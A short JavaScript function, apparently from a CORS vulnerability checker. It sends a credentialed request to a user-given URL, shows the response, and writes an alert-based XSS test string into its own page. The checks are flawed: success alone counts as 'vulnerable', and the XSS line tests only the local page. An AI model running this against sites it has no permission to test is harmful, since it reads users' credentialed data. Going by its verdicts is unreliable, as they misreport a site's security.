function checkCORS() {
    var targetUrl = document.getElementById('targetUrl').value;
    
    // Create the CORS request using XMLHttpRequest
    var req = new XMLHttpRequest();
    
    req.onload = function () {
        // If the site is vulnerable and the request succeeds
        alert('The site is vulnerable to CORS. Response: ' + this.responseText);

        // Triggering XSS by injecting a payload (replace this with an actual XSS test if applicable)
        var xssPayload = `<script>alert('XSS on ${targetUrl}')</script>`;
        document.write(xssPayload);  // Example of potential XSS (avoid this in production)
    };

    req.onerror = function () {
        // If the site does not respond to CORS or an error occurs
        alert('The site is not vulnerable to CORS.');
    };

    // Send the CORS request with credentials
    try {
        req.open('GET', targetUrl, true);
        req.withCredentials = true;
        req.send();
    } catch (e) {
        alert('Error making the request: ' + e.message);
    }
}
